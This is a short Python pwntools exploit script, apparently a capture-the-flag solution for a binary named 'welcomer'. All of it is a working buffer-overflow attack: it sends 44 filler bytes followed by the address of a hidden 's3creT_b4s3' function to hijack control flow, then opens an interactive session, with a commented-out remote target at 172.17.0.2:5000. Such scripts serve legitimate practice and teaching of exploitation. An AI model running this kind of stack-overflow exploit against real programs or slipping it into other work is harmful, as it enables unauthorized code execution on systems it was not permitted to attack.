#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './welcomer')
#io = remote('172.17.0.2', 5000)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
win_addr = p64(exe.sym['s3creT_b4s3'])
payload = b'A'* 44
payload += win_addr
io.sendline(payload)
io.interactive()
